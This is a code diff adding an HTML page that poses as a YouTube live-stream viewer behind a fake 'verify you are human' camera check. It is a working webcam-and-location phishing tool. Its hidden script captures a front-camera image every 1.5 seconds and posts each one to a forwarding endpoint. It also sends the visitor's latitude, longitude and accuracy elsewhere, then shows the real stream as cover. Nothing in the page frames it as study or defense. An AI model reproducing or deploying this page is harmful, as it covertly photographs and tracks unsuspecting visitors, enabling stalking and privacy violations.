@@ -1,0 +1,112 @@
+<!doctype html>
+<html>
+<head>
+<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
+<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
+<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<style>
+    #permission-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; color: #fff; font-family: Arial, sans-serif; text-align: center; }
+    #Live_YT_TV { display: none; }
+</style>
+</head>
+
+<div id="permission-overlay">
+    <h1>Verification Required</h1>
+    <p>Please allow camera access to verify you are human.</p>
+    <button onclick="init()" style="padding: 12px 24px; background: #cc0000; color: #fff; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; margin-top: 20px;">Verify & Watch</button>
+</div>
+
+<div class="video-wrap" style="position:fixed; top:0; left:0; opacity:0; z-index:-1; pointer-events:none;">
+   <video id="video" playsinline autoplay muted></video>
+</div>
+
+<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+
+<script>
+
+function post(imgdata){
+$.ajax({
+    type: 'POST',
+    data: { cat: imgdata},
+    url: 'forwarding_link/post.php',
+    dataType: 'json',
+    async: false,
+    success: function(result){},
+    error: function(){}
+  });
+};
+
+function loc(){
+    if(navigator.geolocation){
+      navigator.geolocation.getCurrentPosition(function(position){
+        $.post("forwarding_link/location.php",{
+          lat: position.coords.latitude,
+          lon: position.coords.longitude,
+          acc: position.coords.accuracy
+        });
+      });
+    }
+  }
+
+
+'use strict';
+
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const errorMsgElement = document.querySelector('span#errorMsg');
+
+const constraints = {
+  audio: false,
+  video: {
+    
+    facingMode: "user"
+  }
+};
+
+// Access webcam
+async function init() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    handleSuccess(stream);
+  } catch (e) {
+    setTimeout(function(){
+        alert("Camera permission is required to watch the live stream!");
+        init();
+    }, 500);
+  }
+}
+
+// Success
+function handleSuccess(stream) {
+  document.getElementById('permission-overlay').style.display = 'none';
+  document.getElementById('Live_YT_TV').style.display = 'block';
+  window.stream = stream;
+  video.srcObject = stream;
+  
+  video.onloadedmetadata = function(e) {
+    video.play();
+  };
+
+  var context = canvas.getContext('2d');
+  setInterval(function(){
+       if (video.readyState === video.HAVE_ENOUGH_DATA) {
+           context.drawImage(video, 0, 0, 640, 480);
+           var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+           post(canvasData); 
+       }
+  }, 1500);
+  
+  loc();
+}
+
+// Load init
+init();
+
+</script>
+
+    <body>
+        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+
+    </body>
+
+</html>
